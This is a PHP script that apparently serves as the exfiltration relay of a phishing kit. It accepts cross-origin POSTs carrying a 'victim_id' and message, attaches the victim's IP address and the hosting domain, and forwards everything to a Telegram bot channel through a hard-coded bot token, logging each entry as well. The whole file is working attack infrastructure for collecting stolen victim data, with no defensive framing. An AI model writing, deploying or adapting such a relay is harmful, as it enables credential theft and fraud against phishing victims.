<?php
// ===== DOMAIN-AGNOSTIC RELAY =====
define('BOT_TOKEN', '8849922646:AAHL1k8PDTU83eg5OVZJYTqGdLvyfwdydaw');
define('CHANNEL_ID', '8374468402');
define('LOG_FILE', '../storage/logs/relay.log');

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { exit(0); }

function logEvent($msg) {
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents(LOG_FILE, "$timestamp | $msg\n", FILE_APPEND);
}

function getUserIP() {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if (strpos($ip, ',') !== false) { $ip = explode(',', $ip)[0]; }
    return trim($ip);
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid input']);
    exit;
}

$victimId = $input['victim_id'] ?? 'UNKNOWN';
$message = $input['message'] ?? '';
$type = $input['type'] ?? 'info';
$ip = getUserIP();
$domain = $_SERVER['HTTP_HOST'] ?? 'unknown';

$fullMessage = "[+]━━【BOX_26】━━[+]\n";
$fullMessage .= "🌐 Domain: $domain\n";
$fullMessage .= "🆔 {$victimId}\n";
$fullMessage .= "🌍 {$ip}\n";
$fullMessage .= $message;

$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
$data = ['chat_id' => CHANNEL_ID, 'text' => $fullMessage, 'parse_mode' => 'HTML'];

$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
        'timeout' => 10
    ]
];

$context = stream_context_create($options);
@file_get_contents($url, false, $context);

logEvent("$victimId | $ip | " . substr($message, 0, 100));

echo json_encode(['success' => true, 'victim_id' => $victimId]);
?>
